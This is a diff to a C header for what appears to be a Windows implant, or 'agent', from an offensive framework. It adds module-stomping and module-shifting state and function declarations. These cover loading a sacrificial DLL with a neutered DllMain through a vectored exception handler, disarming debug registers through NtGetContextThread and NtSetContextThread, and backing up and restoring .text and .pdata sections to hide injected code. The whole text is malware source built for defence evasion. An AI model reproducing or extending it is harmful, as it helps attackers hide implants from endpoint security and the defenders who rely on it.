@@ -22,6 +22,18 @@
 
 #include <windows.h>
 
+// Shift-mode pad offset normalization (shared by module_stomp.cc and
+// module_shift.cc): the builder stamps MODULE_SHIFT_PAD 1 when padding is
+// enabled; translate that to the actual byte offset here.
+#ifdef MODULE_SHIFT_PAD
+#if MODULE_SHIFT_PAD == 1
+#undef MODULE_SHIFT_PAD
+#define MODULE_SHIFT_PAD 0x200
+#endif
+#else
+#define MODULE_SHIFT_PAD 0
+#endif
+
 // ── Forward declarations ──
 struct _INSTANCE;
 typedef struct _INSTANCE INSTANCE, *PINSTANCE;
@@ -42,6 +54,9 @@ typedef struct _MODULE_STOMP_CTX {
     PVOID   pSacLdrEntry;               // LDR_DATA_TABLE_ENTRY* of sacrifice DLL
     BOOL    bLdrEntryFound;             // TRUE once LDR entry located
     BOOL    bEntryPatched;              // TRUE once EntryPoint replaced with ret
+    DWORD64 qwSacImageBase;             // Image base of the sacrifice being loaded
+    void*   pGetCtx;                    // NtGetContextThread (direct DR disarm in VEH)
+    void*   pSetCtx;                    // NtSetContextThread
 
     // Sacrifice DLL info (populated after LoadLibraryW returns)
     PVOID   pSacDllBase;                // Base address of loaded sacrifice DLL
@@ -53,6 +68,19 @@ typedef struct _MODULE_STOMP_CTX {
 
     // Ret gadget used to replace DllMain entry
     PVOID   pRetGadget;
+
+#ifdef INCLUDE_EVASION_MODULE_SHIFT
+    // ─── Module shifting (backup/restore) state ───
+    BOOL    bShiftActive;               // TRUE when stomp runs in module_shift mode
+    DWORD   dwShiftPad;                 // Offset into the section where the blob lands
+    PVOID   pTextBackup;                // Original .text bytes (backup before overwrite)
+    SIZE_T  szTextBackup;               // Size of the .text backup
+    DWORD   dwTextProt;                 // Original .text protection (captured pre-flip)
+    PVOID   pPdataBackup;               // Original .pdata bytes
+    SIZE_T  szPdataBackup;              // Size of the .pdata backup
+    DWORD   dwPdataProt;                // Original .pdata protection
+    BOOL    bBackupRestored;            // One-shot guard for the exit restore
+#endif
 } MODULE_STOMP_CTX, *PMODULE_STOMP_CTX;
 
 // ── API ──
@@ -63,6 +91,19 @@ typedef struct _MODULE_STOMP_CTX {
 // execution to the stomped copy of the agent. On failure it returns FALSE
 // and the agent continues from its original allocation.
 BOOL module_stomp_init(PINSTANCE inst);
+
+#ifdef INCLUDE_EVASION_MODULE_SHIFT
+// Restore the sacrifice DLL's original section bytes (module_shift mode).
+// Called from the agent exit path. Never returns when a .text backup exists -
+// the restore stub hands off directly to ExitThread/ExitProcess because the
+// restoring code lives inside the region being restored.
+VOID module_shift_restore(PINSTANCE inst);
+
+// Shared sacrifice-DLL loader: VEH-intercepted LoadLibraryW with neutered
+// DllMain, section discovery. Used by both module_stomp_init and the
+// shift-and-restore bootstrap path (module_shift.cc).
+BOOL ms_load_sacrifice(PINSTANCE inst, PMODULE_STOMP_CTX ctx);
+#endif
 
 #endif // _WIN64
 #endif // INCLUDE_EVASION_MODULE_STOMP
